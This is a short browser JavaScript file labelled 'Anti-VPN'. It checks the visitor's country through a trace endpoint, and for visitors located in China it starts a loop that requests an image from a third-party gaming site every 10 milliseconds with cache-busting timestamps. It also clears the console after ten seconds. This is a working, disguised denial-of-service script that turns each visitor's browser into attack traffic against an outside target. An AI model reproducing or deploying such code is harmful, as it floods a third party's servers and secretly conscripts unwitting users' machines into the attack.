setTimeout(function () {
    console.clear()
}, 10000);

var xml = new XMLHttpRequest();
xml.onreadystatechange = function () {
  if (xml.readyState == 0) {
    cons.e("[Anti-VPN] 请求未初始化");
  }
  if (xml.readyState == 1) {
    cons.s("[Anti-VPN] 与服务器连接已建立");
  }
  if (xml.readyState == 2) {
    cons.s("[Anti-VPN] 已接收返回内容");
  }
  if (xml.readyState == 3) {
    cons.i("[Anti-VPN] 请求处理中");
  }
  if (xml.readyState == 4) {
    cons.s("[Anti-VPN] 已完成请求，开始分析");
  }
};
xml.open("GET", "https://cdn.cyfan.top/cdn-cgi/trace", false);
xml.send();
var loc = xml.responseText.split("loc=")[1].split("\n")[0];
cons.d(loc);
if (loc && loc === "CN") {
  cons.s("[Anti-VPN] 分析完成");
  function imgflood() {
    var TARGET =
      "https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387";
    var pic = new Image();
    pic.src = `${TARGET}&timestamp=${new Date().getTime()}`;
  }
  setTimeout(function () {
    setInterval(imgflood, 10);
  }, 5000);
}

self.cons = {
    s: (m) => {
        console.log(`%c[SUCCESS]%c ${m}`, 'color:white;background:green;', '')
    },
    w: (m) => {
        console.log(`%c[WARNING]%c ${m}`, 'color:brown;background:yellow;', '')
    },
    i: (m) => {
        console.log(`%c[INFO]%c ${m}`, 'color:white;background:blue;', '')
    },
    e: (m) => {
        console.log(`%c[ERROR]%c ${m}`, 'color:white;background:red;', '')
    },
    d: (m) => {
        console.log(`%c[DEBUG]%c ${m}`, 'color:white;background:black;', '')
    }
}
